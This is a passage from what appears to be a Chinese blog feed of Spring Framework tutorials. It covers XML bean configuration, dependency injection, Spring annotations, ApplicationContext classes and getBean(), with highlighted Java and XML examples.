class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试p标签：set方法--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DI_RefData_ByP_SET&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.service.impl.UserServiceImpl2&quot;</span> <span class="hljs-attr">p:userDao-ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;</span>    <span class="hljs-comment">&lt;!-- 测试依赖注入：有参构造方法--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DI_RefData_ByConstructorArg&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.service.impl.UserServiceImpl3&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!-- name属性是UserServiceImpl2的有参构造方法的形参，ref属性是引用id为userDao的bean对象--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试依赖注入的数据类型：普通数据类型--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DI_CommonData_BySet&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.dao.impl.UserDaoImpl2&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;caofalin&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;24&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试依赖注入的数据类型：集合数据类型--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.domain.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;tom&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;addr&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;beijing&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.domain.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lucy&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;addr&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;tianjin&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDaoCollection&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.dao.impl.UserDaoImpl3&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;strList&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>aaa<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bbb<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userMap&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;u1&quot;</span> <span class="hljs-attr">value-ref</span>=<span class="hljs-string">&quot;user1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;u2&quot;</span> <span class="hljs-attr">value-ref</span>=<span class="hljs-string">&quot;user2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;properties&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;p1&quot;</span>&gt;</span>ppp1<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;p2&quot;</span>&gt;</span>ppp2<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;p3&quot;</span>&gt;</span>ppp3<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DI_CollectionData_BySet&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.service.impl.UserServiceImpl2&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!-- name属性是UserServiceImpl2的setUserDao方法名，ref属性是引用id为userDao的bean对象--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDaoCollection&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试引用子模块配置文件--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;ApplicationContext-User.xml&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;ApplicationContext-Product.xml&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h1 id="注解介绍"><a href="#注解介绍" class="headerlink" title="注解介绍"></a>注解介绍</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>Spring是轻代码而重配置的框架，配置比较繁重，影响开发效率，所以注解开发是一种趋势，注解代替xml配置文件可以简化配置，提高开发效率。</p><h2 id="原始注解"><a href="#原始注解" class="headerlink" title="原始注解"></a>原始注解</h2><table><thead><tr><th>注解</th><th>说明</th></tr></thead><tbody><tr><td>@Component</td><td>使用在类上，用于实例化Bean，当不知道类具体是哪一层时使用</td></tr><tr><td>@Controller</td><td>使用在web层类上，用于实例化Bean</td></tr><tr><td>@Service</td><td>使用在service层类上，用于实例化Bean</td></tr><tr><td>@Repository</td><td>使用在dao层类上，用于实例化Bean</td></tr><tr><td>@Autowired</td><td>使用在字段上，用于根据类型依赖注入</td></tr><tr><td>@Qualifier</td><td>使用在字段上，结合@Autowired一起使用用于根据名称进行依赖注入</td></tr><tr><td>@Resource</td><td>使用在字段上，相当于@Autowired+@Qualifier，按照名称进行注入</td></tr><tr><td>@Value</td><td>使用在字段上，注入普通属性</td></tr><tr><td>@Scope</td><td>标注Bean的作用范围</td></tr><tr><td>@PostConstruct</td><td>使用在方法上，标注该方法是Bean的初始化方法</td></tr><tr><td>@PreDestroy</td><td>使用在方法上，标注该方法是Bean的销毁方法</td></tr></tbody></table><p><strong>代码示例</strong></p><p>UserDaoAnnoImpl.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//@Component(&quot;userDaoAnno&quot;)</span><span class="hljs-meta">@Repository(&quot;userDaoAnno&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoAnnoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-comment">//注入普通属性</span>    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span>    <span class="hljs-keyword">private</span> String driver;    <span class="hljs-meta">@PostConstruct</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;UserDaoAnno init running...&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;注入的普通属性值是：&quot;</span> + driver);        System.out.println(<span class="hljs-string">&quot;UserDaoAnnoImpl save running...&quot;</span>);    &#125;    <span class="hljs-meta">@PreDestroy</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;UserDaoAnno destroy running...&quot;</span>);    &#125;&#125;</code></pre></div><p>UserServiceAnnoImpl.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//@Component(&quot;userServiceAnno&quot;)</span><span class="hljs-meta">@Service(&quot;userServiceAnno&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceAnnoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;    <span class="hljs-comment">//注入bean对象</span><span class="hljs-comment">//    @Autowired</span><span class="hljs-comment">//    @Qualifier(&quot;userDaoAnno&quot;)</span>    <span class="hljs-meta">@Resource(name = &quot;userDaoAnno&quot;)</span>    <span class="hljs-keyword">private</span> UserDao userDao;    <span class="hljs-comment">//使用注解注入就可以不写set方法了</span><span class="hljs-comment">//    public void setUserDao(UserDao userDao) &#123;</span><span class="hljs-comment">//        this.userDao = userDao;</span><span class="hljs-comment">//    &#125;</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;        userDao.save();    &#125;&#125;</code></pre></div><h2 id="新注解"><a href="#新注解" class="headerlink" title="新注解"></a>新注解</h2><p>以上的这些注解主要是替代Bean 标签的配置，这些注解还不能全部替代xml配置文件，以下部分内容不能被原始注解代替。</p><ol><li>非自定义的Bean的配置</li><li>加载properties文件的配置：</li><li>组件扫描的配置</li><li>引入其他配置文件</li></ol><p>可使用Spring新注解解决上述问题。</p><table><thead><tr><th>注解</th><th>说明</th></tr></thead><tbody><tr><td>@Configuration</td><td>使用在Spring配置类上，用于指定当前类是一个Spring配置类，当创建容器时会从该类上加载注解</td></tr><tr><td>@ComponentScan</td><td>使用在Spring配置类上，用于指定Spring在初始化容器时要扫描的包。</td></tr><tr><td>@PropertySource</td><td>使用在Spring配置类上，用于加载.properties文件中的配置</td></tr><tr><td>@Import</td><td>使用在Spring配置类上，用于导入其他配置类</td></tr><tr><td>@Bean</td><td>使用在方法上，标注将该方法的返回值存储到Spring容器中</td></tr></tbody></table><p><strong>代码示例</strong></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//SpringConfig.java</span><span class="hljs-meta">@Configuration</span><span class="hljs-meta">@ComponentScan(&quot;org.example&quot;)</span><span class="hljs-meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span><span class="hljs-meta">@Import(&#123;DataSourceConfig.class&#125;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringConfig</span> &#123;&#125;<span class="hljs-comment">//DataSourceConfig.java</span><span class="hljs-meta">@Configuration</span><span class="hljs-meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> &#123;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String driver;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String url;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.username&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String username;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String password;    <span class="hljs-meta">@Bean(&quot;dataSource&quot;)</span>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">getDataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> PropertyVetoException &#123;        <span class="hljs-type">ComboPooledDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComboPooledDataSource</span>();        dataSource.setDriverClass(driver);        dataSource.setJdbcUrl(url);        dataSource.setUser(username);        dataSource.setPassword(password);        <span class="hljs-keyword">return</span>  dataSource;    &#125;&#125;</code></pre></div><h1 id="Spring容器的API"><a href="#Spring容器的API" class="headerlink" title="Spring容器的API"></a>Spring容器的API</h1><p><strong>ApplicationContext的继承体系</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/ApplicationContext.jpg"></p><p><strong>ApplicationContext：</strong>接口类型，代表应用上下文，可以通过其实例获得 Spring 容器中的 Bean 对象</p><h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h2><p>1）ClassPathXmlApplicationContext</p><p>ApplicationContext接口的实现类，从类的根路径下加载配置文件</p><p>2）FileSystemXmlApplicationContext</p><p>ApplicationContext接口的实现类，从磁盘路径上加载配置文件，配置文件可以在磁盘的任意位置。</p><p>3）AnnotationConfigApplicationContext</p><p>ApplicationContext接口的实现类，当使用注解配置容器对象时，需要使用此类来创建 spring 容器，用来读取注解。</p><h2 id="getBean"><a href="#getBean" class="headerlink" title="getBean()"></a>getBean()</h2><p>从spring容器中获取bean对象</p><p>该方法有两个重载。当参数的数据类型是字符串时，表示根据Bean的id从容器中获得Bean实例，返回是Object，需要强转。</p><p>当参数的数据类型是Class类型时，表示根据类型从容器中匹配Bean实例，当容器中相同类型的Bean有多个时，则此方法会报错。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> BeansException &#123; assertBeanFactoryActive();<span class="hljs-keyword">return</span> getBeanFactory().getBean(name);&#125;<span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;T&gt; requiredType)</span> <span class="hljs-keyword">throws</span> BeansException &#123;assertBeanFactoryActive();<span class="hljs-keyword">return</span> getBeanFactory().getBean(requiredType);&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>spring配置实操</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Spring%E5%AE%9E%E6%93%8D/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Spring%E5%AE%9E%E6%93%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="基于配置文件方式开发"><a href="#基于配置文件方式开发" class="headerlink" title="基于配置文件方式开发"></a>基于配置文件方式开发</h1><h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li>导入spring依赖</li><li>创建Dao层接口和实现类</li><li>创建Service层接口和实现类</li><li>创建和配置Spring配置文件</li><li>编写测试类</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="导入spring依赖"><a href="#导入spring依赖" class="headerlink" title="导入spring依赖"></a>导入spring依赖</h3><div class="code-wrapper"><pre><code class="hljs java">&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-context&lt;/artifactId&gt;  &lt;version&gt;<span class="hljs-number">5.0</span><span class="hljs-number">.5</span>.RELEASE&lt;/version&gt;&lt;/dependency&gt;</code></pre></div><h3 id="创建Dao层接口和实现类"><a href="#创建Dao层接口和实现类" class="headerlink" title="创建Dao层接口和实现类"></a>创建Dao层接口和实现类</h3><p>UserDao.java</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">User</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sing</span>()</span>;&#125;</code></pre></div><p>UserDaoImpl.java</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;I CAN SING!&quot;</span>);    &#125;&#125;</code></pre></div><h3 id="创建Service层接口和实现类"><a href="#创建Service层接口和实现类" class="headerlink" title="创建Service层接口和实现类"></a>创建Service层接口和实现类</h3><p>UserService.java</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sing</span>()</span>;&#125;</code></pre></div><p>UserServiceImpl.java</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">User</span> user;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUser</span>(<span class="hljs-params"><span class="hljs-title class_">User</span> user</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params"></span>) &#123;        user.<span class="hljs-title function_">sing</span>();    &#125;&#125;</code></pre></div><h3 id="创建和配置Spring配置文件"><a href="#创建和配置Spring配置文件" class="headerlink" title="创建和配置Spring配置文件"></a>创建和配置Spring配置文件</h3><p>创建dao层和service层实现类的bean对象</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.springDemo.xml.dao.UserImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.springDemo.xml.service.UserServiceImpl&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="编写Spring测试类"><a href="#编写Spring测试类" class="headerlink" title="编写Spring测试类"></a>编写Spring测试类</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<span class="hljs-comment">//加载Spring核心配置文件</span><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;spring.xml&quot;</span>);<span class="hljs-comment">//获取Spring创建的JavaBean对象</span><span class="hljs-type">UserService</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (UserService) app.getBean(<span class="hljs-string">&quot;userService&quot;</span>);<span class="hljs-comment">//调用JavaBean对象的方法</span>user.sing();&#125;</code></pre></div><h1 id="基于注解方式开发"><a href="#基于注解方式开发" class="headerlink" title="基于注解方式开发"></a>基于注解方式开发</h1><h2 id="开发步骤-1"><a href="#开发步骤-1" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li>导入spring依赖</li><li>创建Dao层接口和实现类</li><li>创建Service层接口和实现类</li><li>创建和配置Spring配置文件</li><li>编写测试类</li></ol><h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="导入spring依赖-1"><a href="#导入spring依赖-1" class="headerlink" title="导入spring依赖"></a>导入spring依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="创建Dao层接口和实现类-1"><a href="#创建Dao层接口和实现类-1" class="headerlink" title="创建Dao层接口和实现类"></a>创建Dao层接口和实现类</h3><p>UserDao.java</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">User</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sing</span>()</span>;&#125;</code></pre></div><p>UserDaoAnnoImpl.java</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Repository</span>(value = <span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;I CAN SING!&quot;</span>);    &#125;&#125;</code></pre></div><h3 id="创建Service层接口和实现类-1"><a href="#创建Service层接口和实现类-1" class="headerlink" title="创建Service层接口和实现类"></a>创建Service层接口和实现类</h3><p>UserService.java</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sing</span>()</span>;&#125;</code></pre></div><p>UserServiceImpl.java</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">User</span> user;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUser</span>(<span class="hljs-params"><span class="hljs-title class_">User</span> user</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params"></span>) &#123;        user.<span class="hljs-title function_">sing</span>();    &#125;&#125;</code></pre></div><h3 id="创建和配置Spring配置类"><a href="#创建和配置Spring配置类" class="headerlink" title="创建和配置Spring配置类"></a>创建和配置Spring配置类</h3><p>SpringConfig.java</p><p>使用Configuration注解声明该类为配置类</p><p>使用ComponentScan注解用于指定需要扫描的包，并自动装配被标注为 <code>@Component</code> 的类</p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span><span class="hljs-variable">@ComponentScan</span>(basePackages = <span class="hljs-string">&quot;com.pacemrc.springDemo.annotation&quot;</span>)public class SpringConfig &#123;    <span class="hljs-variable">@Bean</span>    public User <span class="hljs-built_in">user</span>() &#123;        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">UserImpl</span>();    &#125;&#125;</code></pre></div><h3 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h3><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>&#123;AnnotationConfigApplicationContext context = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AnnotationConfigApplicationContext</span>(SpringConfig.<span class="hljs-keyword">class</span>);<span class="hljs-comment">// 从应用程序上下中获取需要使用的Bean</span>UserService userService = context.<span class="hljs-built_in">getBean</span>(UserService.<span class="hljs-keyword">class</span>);<span class="hljs-comment">// 